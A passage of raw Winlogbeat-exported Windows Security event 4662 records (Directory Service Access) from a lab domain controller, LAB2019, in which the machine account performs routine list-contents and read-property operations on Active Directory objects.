	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{bf967a8b-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{136b2f78-f565-44e5-94fa-df669a4fa178}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967a8b-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{136b2f78-f565-44e5-94fa-df669a4fa178}"	DS	"%{bf967a8b-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967a8b-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109829	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:13.230"	"CBC8b54ByrYY_kgLwO6Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:14.770"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}
	Object Name:		%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}"	DS	"%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109828	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:13.229"	"BxC8b54ByrYY_kgLwO6Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:14.770"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109823	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:13.229"	"BhC8b54ByrYY_kgLwO6Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:14.770"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109820	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:13.229"	"BRC8b54ByrYY_kgLwO6Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:14.770"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
			{f3a64788-5306-11d1-a9c5-0000f80367c1}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{26d9736d-6070-11d1-a9c6-0000f80367c1}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
			{f3a64788-5306-11d1-a9c5-0000f80367c1}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{26d9736d-6070-11d1-a9c6-0000f80367c1}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109817	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:13.229"	"BBC8b54ByrYY_kgLwO6Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:14.770"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109814	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:13.229"	"AxC8b54ByrYY_kgLwO6Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:14.770"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{3e0abfd0-126a-11d0-a060-00aa006c33ed}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{3e0abfd0-126a-11d0-a060-00aa006c33ed}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109813	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:13.227"	"AhC8b54ByrYY_kgLwO6Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:14.770"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{67212414-7bcc-4609-87e0-088dad8abdee}
	Object Name:		%{86fd1a02-26cc-4653-85f6-37709e8229a2}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
	{67212414-7bcc-4609-87e0-088dad8abdee}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{86fd1a02-26cc-4653-85f6-37709e8229a2}"	DS	"%{67212414-7bcc-4609-87e0-088dad8abdee}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
	{67212414-7bcc-4609-87e0-088dad8abdee}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109810	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:13.227"	"ARC8b54ByrYY_kgLwO6Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:14.770"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{e11505d7-92c4-43e7-bf5c-295832ffc896}
	Object Name:		%{23ecd0f5-43f2-42a5-b52a-0f95549723c6}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{e11505d7-92c4-43e7-bf5c-295832ffc896}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{23ecd0f5-43f2-42a5-b52a-0f95549723c6}"	DS	"%{e11505d7-92c4-43e7-bf5c-295832ffc896}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{e11505d7-92c4-43e7-bf5c-295832ffc896}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109807	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:13.227"	"ABC8b54ByrYY_kgLwO6Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:14.770"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{67212414-7bcc-4609-87e0-088dad8abdee}
	Object Name:		%{86fd1a02-26cc-4653-85f6-37709e8229a2}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{67212414-7bcc-4609-87e0-088dad8abdee}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{86fd1a02-26cc-4653-85f6-37709e8229a2}"	DS	"%{67212414-7bcc-4609-87e0-088dad8abdee}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{67212414-7bcc-4609-87e0-088dad8abdee}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109806	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:13.226"	"_xC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:14.770"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109801	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:13.226"	"_hC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:14.770"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109800	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:13.226"	"_RC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:14.770"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
